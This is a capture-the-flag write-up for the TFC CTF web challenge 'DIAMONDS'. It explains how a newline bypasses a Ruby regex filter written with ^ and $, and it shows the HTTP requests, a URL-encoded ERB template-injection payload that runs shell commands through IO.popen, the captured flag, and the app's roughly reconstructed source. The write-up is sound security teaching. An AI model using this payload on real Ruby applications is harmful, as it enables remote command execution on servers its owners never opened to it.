# TFC CTF

## WEB

### DIAMONDS

**Difficulty:** Medium

**Statement:** Write something nice that passes our filter.

***

The website indicates that regexes are in place:

![image](https://user-images.githubusercontent.com/49941629/182034164-957af5a6-c7f2-459b-93e9-09658f21f78b.png)

After some tests on the website and via the name of the challenge, I know that the site is written in Ruby.

The web server sends back via the headers the following information: `WEBrick/1.6.1 (Ruby/2.7.5/2021-11-24)`

Following a long search, I found the following resources that will help me to exploit this flaw in order to bypass the regex.
- https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/
- http://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html

A few tries after, I notice that the regex only let the characters `[a-zA-Z0-9]` through.

Thanks to the above resources, I will modify my HTTP POST request to inject a newline `%0A` in order to perform a command injection if the regex configuration is wrong.

Default POST request :

```
POST / HTTP/1.1
Host: 01.linux.challenges.ctf.thefewchosen.com:49396
Content-Length: 7
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://01.linux.challenges.ctf.thefewchosen.com:49396
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://01.linux.challenges.ctf.thefewchosen.com:49396/
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

input=x
```

Modified POST request :

```
POST / HTTP/1.1
Host: 01.linux.challenges.ctf.thefewchosen.com:49396
Content-Length: 7
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://01.linux.challenges.ctf.thefewchosen.com:49396
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://01.linux.challenges.ctf.thefewchosen.com:49396/
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

input=x%0A
{}
```

I see that the regex is well bypassed :

![image](https://user-images.githubusercontent.com/49941629/182034446-27ac66fc-0f2c-48e0-a000-4d0e76f5dd87.png)

Via the following payload, I can inject commands :

```
input=x%0A
%3C%25%3D%20IO.popen%28%27ls%20-ah%20.%20%2F%27%29.readlines%28%29%20%20%25%3E
```

![image](https://user-images.githubusercontent.com/49941629/182034644-96e00ca0-c14e-49b2-aba2-d4fc2f50f84a.png)

I just have to `cat` the flag with the payload :

![image](https://user-images.githubusercontent.com/49941629/182034715-e10c7fa5-7c1f-4056-95f4-7a0fe26cf143.png)

Flag: TFCCTF{02718f35dddc266e0ac40c0c0dcc98c34edd545678dc752ba9831b6d73bc706f}

By curiosity, I recovered the contents of the file `input.rb` to see the configured regex :

```ruby
require 'sinatra/base'

class Animated_template < Sinatra::Base
configure do
  set: views, app / views
set: public_dir, public
end

get '/'
do
  @input = \"Write something nice here that passes our regex"
erb: 'index'
end

post '/'
do
  if params[: input] = ~/^[0-9a-z ]+$/i
@input = ERB.new(params[: input]).result(binding)
else
  @input = "That is far away from nice !!"
end
erb: 'index'
end

get '/style.css'
do
  erb: 'style'
end
end
```

